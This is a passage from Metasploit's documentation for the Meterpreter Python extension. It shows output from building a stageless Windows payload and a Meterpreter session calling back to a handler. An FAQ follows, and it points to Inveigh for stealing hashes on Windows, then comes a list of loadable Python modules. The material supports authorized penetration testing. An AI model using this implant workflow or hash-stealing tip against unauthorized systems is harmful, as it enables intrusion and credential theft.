+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 6412437 bytes
+Saved as: /tmp/met-stageless.exe
+</code></pre></div></div><p>When this payload is executed, the transport is added and shown to be present in the transport list immediately:</p><div class="language-msf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="zp">msf</span> exploit<span class="p">(</span><span class="kc">handler</span><span class="p">)</span> <span class="p">&gt;</span> [*] Meterpreter session 2 opened (172.16.52.1:4445 -&gt; 172.16.52.247:49159) at 2015-12-13 11:06:54 +1000
+
+<span class="zp">msf</span> exploit<span class="p">(</span><span class="kc">handler</span><span class="p">)</span> <span class="p">&gt;</span> sessions -i -1
+<span class="zs">[*]</span> Starting interaction with 2...
+
+<span class="zp">meterpreter</span> <span class="p">&gt;</span> transport list
+Session Expiry  : @ 2015-12-20 11:06:52
+
+    ID  Curr  URL                     Comms T/O  Retry Total  Retry Wait
+    --  ----  ---                     ---------  -----------  ----------
+    1         tcp://127.0.0.1:8000    300        3600         10
+    2   *     tcp://172.16.52.1:4445  300        3600         10
+</code></pre></div></div><p>This stageless initialisation feature allows for long-running Python scripts to be run before Meterpreter even calls home. This is really handy in so many ways, so get creative and show us how awesome this can be.</p><h2 id="faq"> <a href="#faq" class="anchor-heading" aria-labelledby="faq"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> FAQ</h2><blockquote><p>Does the extension do dynamic resolution of Python libraries at runtime?</p></blockquote><p>Yes. The extension has a built-in import handler that loads modules from memory. This includes modules that the user has dynamically loaded using the <code class="language-plaintext highlighter-rouge">python_import</code> command. If a module doesn’t exist as part of the extension then resolution will fail. Down the track we may look into extending this feature so that missing libraries are uploaded on-the-fly when an import fails, but it’s not known when this work will get done.</p><blockquote><p>When will this extension be available for other Meterpreters?</p></blockquote><p>We’re not yet able to put a timeline on this.</p><blockquote><p>Is it possible to use the Python extension to run Responder?</p></blockquote><p>Unfortunately, no it is not. Responder makes the assumption that port <code class="language-plaintext highlighter-rouge">445</code> is available for use on the target, which is why it functions nicely on *nix systems that don’t make use of this port by default. On Windows systems, port <code class="language-plaintext highlighter-rouge">445</code> is already in use by system services and hence can’t be bound to.</p><p>There is a Powershell-based project that aims to do the same thing as Responder, and that is called <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>. This utility piggy-backs of the existing SMB service, and appears to do quite a good job of stealing hashes, so it’s recommended that this be used instead.</p><blockquote><p>Is it perfect?</p></blockquote><p>Hell no! But the goal is to get closer and closer to perfect as we go. It’s up to you to help us improve it along the way by using it in interesting ways, and submitting bugs when it breaks.</p><blockquote><p>Can I suggest a feature?</p></blockquote><p>Please do, making good use of the Github issues feature. Better still, create a PR for one!</p><h2 id="currently-loadable-native-libraries"> <a href="#currently-loadable-native-libraries" class="anchor-heading" aria-labelledby="currently-loadable-native-libraries"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Currently Loadable Native Libraries</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__future__
+__phello__
+_abcoll
+_osx_support
+_pyio
+_strptime
+_threading_local
+_weakrefset
+abc
+aifc
+antigravity
+argparse
+asynchat
+asyncore
+atexit
+audiodev
+base64
+BaseHTTPServer
+Bastion
+bdb
+binhex
+bisect
+calendar
+cgi
+CGIHTTPServer
+cgitb
+chunk
+cmd
+code
+codecs
+codeop
+collections
+colorsys
+commands
+compileall
+compiler
+compiler.ast
+compiler.consts
+compiler.future
+compiler.misc
+compiler.pyassem
+compiler.pycodegen
+compiler.symbols
+compiler.syntax
+compiler.transformer
+compiler.visitor
+ConfigParser
+contextlib
+Cookie
+cookielib
+copy
+copy_reg
+cProfile
+csv
+ctypes
+ctypes._endian
+ctypes.util
+ctypes.wintypes
+decimal
+difflib
+dircache
+dis
+DocXMLRPCServer
+dummy_thread
+dummy_threading
+email
+email._parseaddr
+email.base64mime
+email.charset
+email.encoders
+email.errors
+email.feedparser
+email.generator
+email.header
+email.iterators
+email.message
+email.parser
+email.quoprimime
+email.utils
+email.mime
+email.mime.application
+email.mime.audio
+email.mime.base
+email.mime.image
+email.mime.message
+email.mime.multipart
+email.mime.nonmultipart
+email.mime.text
+encodings
+encodings.aliases
+encodings.ascii
+encodings.base64_codec
+encodings.charmap
+encodings.cp037
+encodings.cp1006
+encodings.cp1026
+encodings.cp1140
+encodings.cp1250
+encodings.cp1251
+encodings.cp1252
+encodings.cp1253
+encodings.cp1254
+encodings.cp1255
+encodings.cp1256
+encodings.cp1257
+encodings.cp1258
+encodings.cp424
+encodings.cp437
+encodings.cp500
+encodings.cp720
+encodings.cp737
+encodings.cp775
+encodings.cp850
+encodings.cp852
+encodings.cp855
+encodings.cp856
+encodings.cp857
+encodings.cp858
+encodings.cp860
+encodings.cp861
+encodings.cp862
+encodings.cp863
+encodings.cp864
+encodings.cp865
+encodings.cp866
+encodings.cp869
+encodings.cp874
+encodings.cp875
+encodings.hex_codec
+encodings.hp_roman8
+encodings.idna
+encodings.iso8859_1
+encodings.iso8859_10
+encodings.iso8859_11
+encodings.iso8859_13
+encodings.iso8859_14
+encodings.iso8859_15
+encodings.iso8859_16
+encodings.iso8859_2
+encodings.iso8859_3
+encodings.iso8859_4
+encodings.iso8859_5
+encodings.iso8859_6
+encodings.iso8859_7
+encodings.iso8859_8
+encodings.iso8859_9
+encodings.koi8_r
+encodings.koi8_u
+encodings.latin_1
+encodings.mac_arabic
+encodings.mac_centeuro
+encodings.mac_croatian
+encodings.mac_cyrillic
+encodings.mac_farsi
+encodings.mac_greek
+encodings.mac_iceland
+encodings.mac_latin2
+encodings.mac_roman
+encodings.mac_romanian
+encodings.mac_turkish
+encodings.mbcs
+encodings.palmos
+encodings.ptcp154
+encodings.punycode
+encodings.quopri_codec
+encodings.raw_unicode_escape
+encodings.rot_13
+encodings.string_escape
+encodings.tis_620
+encodings.undefined
+encodings.unicode_escape
+encodings.unicode_internal
+encodings.utf_16
+encodings.utf_16_be
+encodings.utf_16_le
+encodings.utf_32
+encodings.utf_32_be
+encodings.utf_32_le
+encodings.utf_7
+encodings.utf_8
+encodings.utf_8_sig
+encodings.uu_codec
+encodings.zlib_codec
+filecmp
+fileinput
+fnmatch
+formatter
+fpformat
+fractions
+ftplib
+functools
+genericpath
+getopt
+getpass
+gettext
+glob
+gzip
+hashlib
+heapq
+hmac
+htmlentitydefs
+htmllib
+HTMLParser
+httplib
+ihooks
+imaplib
+imghdr
+importlib
+imputil
+inspect
+io
+json
+json.decoder
+json.encoder
+json.scanner
+json.tool
+keyword
+linecache
+locale
+logging
+logging.config
+logging.handlers
+macpath
+macurl2path
+mailbox
+mailcap
+markupbase
+md5
+meterpreter
+meterpreter.core
+meterpreter.elevate
+meterpreter.fs
+meterpreter.incognito
+meterpreter.kiwi
+meterpreter.sys
+meterpreter.tlv
+meterpreter.transport
+meterpreter.user
+meterpreter.extapi
+meterpreter.extapi.adsi
+mhlib
+mimetools
+mimetypes
+MimeWriter
+modulefinder
+multifile
+multiprocessing
+multiprocessing.connection
+multiprocessing.forking
+multiprocessing.heap
+multiprocessing.managers
+multiprocessing.pool
+multiprocessing.process
+multiprocessing.queues
+multiprocessing.reduction
+multiprocessing.sharedctypes
+multiprocessing.synchronize
+multiprocessing.util
+multiprocessing.dummy
+multiprocessing.dummy.connection
+mutex
+netrc
+new
+nntplib
+ntpath
+nturl2path
+numbers
+opcode
+optparse
+os
+os2emxpath
+pdb
+pickle
+pickletools
+pipes
+pkgutil
+platform
+plistlib
+popen2
+poplib
+posixfile
+posixpath
+pprint
+profile
+pstats
+py_compile
+pyclbr
+pydoc
+Queue
+quopri
+random
+re
+repr
+rexec
+rfc822
+rlcompleter
+robotparser
+runpy
+sched
+sets
+sgmllib
+sha
+shelve
+shlex
+shutil
+SimpleHTTPServer
+SimpleXMLRPCServer
+site
+smtplib
+sndhdr
+socket
+SocketServer
+sre
+sre_compile
+sre_constants
+sre_parse
+ssl
+stat
+statvfs
+string
+StringIO
+stringold
+stringprep
+struct
+subprocess
+sunau
+sunaudio
+symbol
+symtable
+sysconfig
+tabnanny
+tarfile
+telnetlib
+tempfile
+textwrap
+this
+threading
+timeit
+toaiff
+token
+tokenize
+trace
+traceback
+types
+urllib
+urllib2
+urlparse
+user
+UserDict
+UserList
+UserString
+uu
+uuid
+warnings
+wave
+weakref
+webbrowser
+whichdb
+wsgiref
+wsgiref.handlers
+wsgiref.headers
+wsgiref.simple_server
+wsgiref.util
+wsgiref.validate
+xdrlib
+xml
+xml.dom
+xml.dom.domreg
+xml.dom.expatbuilder
+xml.dom.minicompat
+xml.dom.minidom
+xml.dom.NodeFilter
+xml.dom.pulldom
+xml.dom.xmlbuilder
+xml.etree
+xml.etree.ElementInclude
+xml.etree.ElementPath
+xml.etree.ElementTree
+xml.parsers
+xml.sax
+xml.sax._exceptions
+xml.sax.handler
+xml.sax.saxutils
+xml.sax.xmlreader
+xmllib
+xmlrpclib
+zipfile
+</code></pre></div></div><hr><footer><p><a href="#top" id="back-to-top">Back to top</a></p><p class="text-small text-grey-dk-000 mb-0"> <a href="https://github.com/rapid7/metasploit-framework/tree/master/docs/metasploit-framework.wiki/Python-Extension.md" id="edit-this-page">Edit this page on GitHub</a></p></footer></div></div><div class="search-overlay"></div></div><script type="text/javascript" src="/assets/js/toggle_mode.js"></script> <script> var config = { theme: 'default', logLevel: 'fatal', securityLevel: 'strict', startOnLoad: true, arrowMarkerAbsolute: false, er: { diagramPadding: 20, layoutDirection: 'TB', minEntityWidth: 100, minEntityHeight: 75, entityPadding: 15, stroke: 'gray', fill: 'honeydew', fontSize: 12, useMaxWidth: true, }, flowchart:{ diagramPadding: 8, htmlLabels: true, curve: 'basis', }, sequence: { diagramMarginX: 50, diagramMarginY: 10, actorMargin: 50, width: 150, height: 65, boxMargin: 10, boxTextMargin: 5, noteMargin: 10, messageMargin: 35, messageAlign: 'center', mirrorActors: true, bottomMarginAdj: 1, useMaxWidth: true, rightAngles: false, showSequenceNumbers: false, }, gantt: { titleTopMargin: 25, barHeight: 20, barGap: 4, topPadding: 50, leftPadding: 75, fontSize: 11, gridLineStartPadding: 35, fontFamily: '\'Open Sans\', sans-serif', numberSectionStyles: 4, axisFormat: '%Y-%m-%d', topAxis: false, }, }; mermaid.initialize(config); window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid')); </script>
